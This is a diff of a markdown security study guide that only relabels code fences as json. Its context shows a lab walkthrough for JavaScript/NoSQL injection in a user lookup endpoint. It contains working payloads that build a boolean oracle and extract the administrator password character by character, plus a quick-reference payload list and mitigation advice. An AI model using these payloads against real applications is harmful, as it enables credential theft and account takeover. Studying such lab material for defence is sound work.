@@ -452,7 +452,7 @@ If user input is placed inside:
 
 then attacker input like:
 
-```
+```json
 wiener' && '1'=='1
 ```
 
@@ -512,7 +512,7 @@ Signs of JavaScript injection risk:
 
 1. Insert `'` to break out of string  
 2. Insert JS logic:
-   ```
+   ```json
    ' && <boolean> || '
    ```
 3. Control TRUE/FALSE responses  
@@ -539,7 +539,7 @@ Capture the request.
 
 ### 2. Intercept lookup request  
 Go to:
-```
+```json
 GET /user/lookup?user=wiener
 ```
 Send to Repeater.
@@ -548,7 +548,7 @@ Send to Repeater.
 
 ### 3. Confirm injection  
 Send:
-```
+```json
 wiener'
 ```
 If error appears → injection confirmed.
@@ -557,7 +557,7 @@ If error appears → injection confirmed.
 
 ### 4. Test safe JavaScript execution  
 Payload:
-```
+```json
 wiener'+'
 ```
 URL-encode it.
@@ -568,12 +568,12 @@ If response still returns valid user info → backend executes JS.
 
 ### 5. Build Boolean oracle  
 FALSE test:
-```
+```json
 wiener' && '1'=='2
 ```
 
 TRUE test:
-```
+```json
 wiener' && '1'=='1
 ```
 
@@ -584,7 +584,7 @@ If TRUE returns profile → oracle confirmed.
 ### 6. Extract admin password length  
 Test progressively:
 
-```
+```json
 administrator' && this.password.length < 30 || 'x'=='x
 administrator' && this.password.length < 20 || 'x'=='x
 administrator' && this.password.length < 10 || 'x'=='x
@@ -600,7 +600,7 @@ Password length = **8**.
 
 Template:
 
-```
+```json
 administrator' && this.password[§0§]=='§a§
 ```
 
@@ -619,7 +619,7 @@ Repeat for all 8 indices → reconstruct full admin password.
 ### 8. Log in as admin  
 Use:
 
-```
+```json
 administrator : <extracted_password>
 ```
 
@@ -637,22 +637,22 @@ Lab solved.
 ## 🔹 COMMON PAYLOADS (QUICK REFERENCE)
 
 Check injection:
-```
+```json
 wiener'
 ```
 
 Boolean oracle:
-```
+```json
 wiener' && '1'=='1
 ```
 
 Password length check:
-```
+```json
 administrator' && this.password.length < 10 || 'a'=='a
 ```
 
 Specific character check:
-```
+```json
 administrator' && this.password[3]=='r' || 'a'=='a
 ```
 
@@ -665,11 +665,11 @@ administrator' && this.password[3]=='r' || 'a'=='a
 3. Enforce strict schema validation (Zod/Joi).  
 4. Reject nested objects and operators.  
 5. Use safe queries:
-   ```
+   ```json
    db.users.find({ username: input })
    ```
    NOT:
-   ```
+   ```json
    db.users.find({ $where: "this.username=='" + input + "'" })
    ```
 
